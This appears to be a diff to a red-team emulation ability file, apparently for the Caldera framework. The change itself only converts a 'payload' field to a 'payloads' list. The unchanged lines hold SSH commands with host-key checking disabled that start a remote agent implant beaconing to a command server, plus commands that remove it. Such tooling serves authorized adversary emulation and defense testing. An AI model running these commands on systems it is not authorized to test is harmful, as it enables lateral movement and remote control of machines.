@@ -1,5 +1,3 @@
----
-
 - id: 10a9d979-e342-418a-a9b0-002c483e0fa6
   name: Start 54ndc47
   description: Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication
@@ -15,7 +13,8 @@
           ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
         cleanup: |
           ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
-        payload: sandcat.go-darwin
+        payloads:
+        - sandcat.go-darwin
     linux:
       sh:
         command: |
@@ -23,4 +22,5 @@
           ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
         cleanup: |
           ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'
-        payload: sandcat.go-linux
+        payloads:
+        - sandcat.go-linux
